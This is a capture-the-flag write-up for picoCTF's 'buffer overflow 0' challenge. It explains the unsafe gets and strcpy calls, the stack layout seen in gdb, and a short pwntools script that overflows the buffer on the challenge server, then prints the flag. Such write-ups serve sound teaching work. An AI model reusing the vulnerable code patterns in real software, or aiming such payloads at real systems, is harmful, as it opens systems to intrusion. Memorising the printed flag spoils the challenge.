# buffer overflow 0

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 100

# Challenge

## Description

Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available [here](./vuln). You can view source [here](./vuln.c). And connect with it using:
`nc saturn.picoctf.net 64712`

## Source

[vuln.c](./vuln.c) (C source)  
[vuln](./vuln) (32-bit ELF)

# Solution

Reading the code, we can see that the flag is printed from the `sigsegv_handler` function. This function is being set as the handler for the `SIGSEGV` signal, which is triggered when the program tries to access an invalid memory address. Let's look at the `vuln()` function:

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

It takes a string as input, and copies it to a buffer of size 16. This is a classic [buffer overflow vulnerability](/Guides/Vulnerabilities/Buffer%20Overflow%20Vulnerability.md). If we pass a string longer than 16 characters, we will overflow the buffer, and overwrite variables on the stack, more specifically, the return address of the function. Let's look at the `vuln()` call in `main()`:

```c
int main(int argc, char **argv){
  ...
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  ...
}
```

The program reads a string from the user, into a buffer of size 100, and passes it to `vuln()`. That should be more than enough for us to trigger a buffer overflow. Let's look at the relative position of `buf2` and the return address on the stack:

```bash
$ gdb ./vuln
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00001353 <+0>:     endbr32
   0x00001357 <+4>:     push   ebp
   0x00001358 <+5>:     mov    ebp,esp
   0x0000135a <+7>:     push   ebx
   0x0000135b <+8>:     sub    esp,0x14
   0x0000135e <+11>:    call   0x149b <__x86.get_pc_thunk.ax>
   0x00001363 <+16>:    add    eax,0x2c49
   0x00001368 <+21>:    sub    esp,0x8
   0x0000136b <+24>:    push   DWORD PTR [ebp+0x8]
   0x0000136e <+27>:    lea    edx,[ebp-0x18]
   0x00001371 <+30>:    push   edx
   0x00001372 <+31>:    mov    ebx,eax
   0x00001374 <+33>:    call   0x1170 <strcpy@plt>
   0x00001379 <+38>:    add    esp,0x10
   0x0000137c <+41>:    nop
   0x0000137d <+42>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x00001380 <+45>:    leave
   0x00001381 <+46>:    ret
End of assembler dump.
```

On lines `<+27>`-`<+30>`, we can see the function loads the memory address of `[ebp-0x18]` to the stack, as an argument to `strcpy`. That means the stack looks like that:

```
[ebp-0x18]  buf2 (size 16)
[ebp-0x08]  ?
[ebp-0x04]  ?
[ebp+0x00]  old ebp (line <+4>)
[ebp+0x04]  return address
```

So, in order to overwrite the return address, we need to pass a string at least 32 characters long (16 + 4 + 4 + 4 + 4), and the last 4 characters should be an invalid memory address, so that the program will try to access it, and trigger a `SIGSEGV` signal. Entering a string filled with `A`'s should do the trick:

```python
from pwn import *

conn = remote('saturn.picoctf.net', 64712)

conn.sendlineafter(b'Input: ', b'A' * 32)
flag = conn.recvline(False).decode()

print('Flag:', flag)
```

```
Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

**The Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`
